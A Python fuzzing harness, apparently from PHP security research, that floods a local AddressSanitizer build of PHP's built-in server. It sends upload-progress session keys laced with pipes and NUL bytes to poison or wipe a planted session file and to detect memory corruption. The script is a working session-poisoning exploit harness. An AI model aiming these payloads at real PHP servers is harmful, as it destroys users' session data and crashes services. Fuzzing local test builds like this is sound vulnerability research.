#!/usr/bin/env python3
# wp2_chaos.py - high-volume randomized poison bomb against one ASAN server
# random key length/content (binary, NULs, pipes), random modes; watches for ASAN death
import os, random, socket, subprocess, sys, threading, time

CL = os.path.dirname(os.path.abspath(__file__))
ART = "/tmp/p2s_c2/chaos"
SESS = f"{ART}/sess"
PORT = 18820
SID = "chaosid0000000000000000000000"
PHP = "/tmp/php8512_build/asan2/sapi/cli/php"
DURATION = float(sys.argv[1]) if len(sys.argv) > 1 else 60.0

os.makedirs(SESS, exist_ok=True)
open(f"{ART}/php.ini", "w").write(f"""session.save_handler = files
session.save_path = "{SESS}"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = 1
session.gc_probability = 0
display_errors = 0
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
memory_limit = 1024M
""")

subprocess.run(["pkill", "-f", f"127.0.0.1:{PORT}"], capture_output=True)
time.sleep(0.5)
env = dict(os.environ, USE_ZEND_ALLOC="0",
           ASAN_OPTIONS="detect_leaks=0:abort_on_error=1")
srv = subprocess.Popen([PHP, "-c", f"{ART}/php.ini", "-S", f"127.0.0.1:{PORT}",
                        "-t", f"{CL}/docroot"],
                       env=env, stdout=open(f"{ART}/srv_out.log", "w"),
                       stderr=open(f"{ART}/srv_err.log", "w"))
for _ in range(100):
    try:
        socket.create_connection(("127.0.0.1", PORT), timeout=0.5).close()
        break
    except OSError:
        time.sleep(0.1)

BND = b"ChaosBnd"
stats = {"req": 0, "wipe": 0, "keep": 0, "other": 0, "err": 0}
lock = threading.Lock()

def rand_key():
    n = random.choice([random.randint(1, 8), random.randint(9, 64),
                       random.randint(65, 1024), random.randint(1025, 65536),
                       random.randint(65537, 200000)])
    b = bytearray(os.urandom(n))
    # ensure binary chaos incl. pipes, NULs, high bytes; bias a pipe in ~90%
    if random.random() < 0.9:
        b[random.randrange(n)] = 0x7C
    if n > 10:
        b[random.randrange(n)] = 0x00
    return bytes(b)

def one_shot():
    key = rand_key()
    fs = random.choice([0, 1, 4096, 65536, 262144])
    victim = b"pref|s:6:\"keepme\";"
    try:
        open(f"{SESS}/sess_{SID}", "wb").write(victim)
    except OSError:
        pass
    part = lambda name, value, fn=None: (
        b'--' + BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        + (b'; filename="' + fn + b'"' if fn else b'') + b'\r\n\r\n' + value + b'\r\n')
    body = part(b"PHP_SESSION_UPLOAD_PROGRESS", key) + part(b"f", b"A" * fs, b"n.txt") + b"--" + BND + b"--\r\n"
    hdr = (f"POST /up.php HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID={SID}\r\n"
           f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=30)
        s.settimeout(30)
        s.sendall(hdr + body)
        while s.recv(65536):
            pass
        s.close()
    except Exception:
        with lock:
            stats["err"] += 1
        return
    try:
        sz = os.stat(f"{SESS}/sess_{SID}").st_size
    except FileNotFoundError:
        sz = -1
    with lock:
        stats["req"] += 1
        if sz == 0:
            stats["wipe"] += 1
        elif sz == len(victim):
            stats["keep"] += 1
        else:
            stats["other"] += 1

def worker():
    t0 = time.time()
    while time.time() - t0 < DURATION:
        if srv.poll() is not None:
            return
        one_shot()

threads = [threading.Thread(target=worker) for _ in range(4)]
t0 = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
alive = srv.poll() is None
srv.terminate()
try:
    srv.wait(timeout=5)
except subprocess.TimeoutExpired:
    srv.kill()
err = open(f"{ART}/srv_err.log", errors="replace").read()
asan = "AddressSanitizer" in err
print(f"CHAOS: dur={DURATION}s threads=4 requests={stats['req']} wipe={stats['wipe']} "
      f"keep={stats['keep']} other={stats['other']} connerr={stats['err']} server_alive={alive} asan={asan}")
if asan:
    i = err.find("AddressSanitizer")
    print(err[i:i+3000])
